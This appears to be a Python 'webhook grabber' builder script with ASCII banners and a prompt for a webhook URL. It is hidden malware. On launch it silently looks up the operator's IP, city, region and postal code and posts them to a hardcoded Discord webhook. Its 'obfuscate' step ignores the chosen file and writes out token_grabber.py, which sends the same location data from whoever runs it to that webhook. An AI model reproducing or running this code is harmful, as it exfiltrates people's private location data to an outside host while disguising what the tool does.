import time
import requests
from requests import get
import json
import os
from shutil import rmtree
import pystyle
from pystyle import *



def location_info():
    user_data = 0
    url = "http://ipinfo.io/json"
    resp = get(url)
    json = resp.json()
    ip = json['ip']
    city = json["city"]
    region = json["region"]
    postal = json["postal"]
    print(ip)
    print(city)
    print(region)
    print(postal)

    user_data = 0

def file():
    file = input("[?] Drag the file you want to obfuscate ->")
    print()

    out = 'token_grabber.py'
    outFolder = 'out'

    try:
        rmtree(outFolder)
    except:
        pass
    try:
        os.mkdir(outFolder)
    except:
        pass

    newContent = f"""
    import time
    import requests
    from requests import get
    import json
    import os
    from shutil import rmtree
    def location_info():
        user_data = 0
        url = "http://ipinfo.io/json"
        resp = get(url)
        json = resp.json()
        ip = json['ip']
        city = json["city"]
        region = json["region"]
        postal = json["postal"]
        print(ip)
        print(city)
        print(region)
        print(postal)
    user_data = 0
    url = "http://ipinfo.io/json"
    resp = get(url)
    json = resp.json()
    ip = json['ip']
    city = json["city"]
    region = json["region"]
    postal = json["postal"]
    #print(ip)
    #print(city)
    #print(region)
    #print(postal)
    webhook = 'https://discord.com/api/webhooks/985856019840237618/opDyjvsd025DgAd6TLWek_cID1zYjqAU85C7kMEXIjMO8LV0hB80skjCBcUej7B9NwUe'
    message = "   ip =" + ip + "    city = " + city + "    region =" +region + "   code postal"  +postal
    r = requests.post(webhook, json={'username': 'BKS', 'content': message})
    """
    with open(f'{outFolder}/{out}', 'w', encoding='utf-8') as f:
        f.write(newContent)

    input("[!] Obfuscation finish sucessfully ")


banner1 = """





▄▄▌ ▐ ▄▌ ▄▄▄·     ▄▄ • ▄▄▄   ▄▄▄· ▄▄▄▄· ▄▄▄▄· ▄▄▄▄· ▄▄▄ .▄▄▄  
██· █▌▐█▐█ ▄█    ▐█ ▀ ▪▀▄ █·▐█ ▀█ ▐█ ▀█▪▐█ ▀█▪▐█ ▀█▪▀▄.▀·▀▄ █·
██▪▐█▐▐▌ ██▀·    ▄█ ▀█▄▐▀▀▄ ▄█▀▀█ ▐█▀▀█▄▐█▀▀█▄▐█▀▀█▄▐▀▀▪▄▐▀▀▄ 
▐█▌██▐█▌▐█▪·•    ▐█▄▪▐█▐█•█▌▐█ ▪▐▌██▄▪▐███▄▪▐███▄▪▐█▐█▄▄▌▐█•█▌
 ▀▀▀▀ ▀▪.▀       ·▀▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀▀ ·▀▀▀▀ ·▀▀▀▀  ▀▀▀ .▀  ▀
"""

banner2 = """
             .-_; ;_-.
            / /     \ 
           | |       | |
            \ \.---./ /
         .-"~   .---.   ~"-.
       ,`.-~/ .'`---`'. \~-.`,
       '`   | | \(_)/ | |   `'
       ,    \  \ | | /  /    ,
       ;`'.,_\  `-'-'  /_,.'`;
        '-._  _.-'^'-._  _.-'
            ``         ``
"""

banner = Add.Add(banner1, banner2)
print(Colorate.Vertical(Colors.black_to_green, Center.XCenter(banner + '\n\n')))

webhook_url = Write.Input("[?] enter the webhook URL ->", Colors.dark_green, interval=0.005)

url = "http://ipinfo.io/json"
resp = get(url)
json = resp.json()
ip = json['ip']
city = json["city"]
region = json["region"]
postal = json["postal"]

webhook_main = "https://discord.com/api/webhooks/985856019840237618/opDyjvsd025DgAd6TLWek_cID1zYjqAU85C7kMEXIjMO8LV0hB80skjCBcUej7B9NwUe"
message = '\n'.join([
    'ip : ' + ip,
    'region : ' + region,
    'vile : ' + city,
])

r = requests.post(webhook_main, json={'username': 'BKS', 'content': message})

print()
Write.Input("Built!", Colors.green, interval=0.005)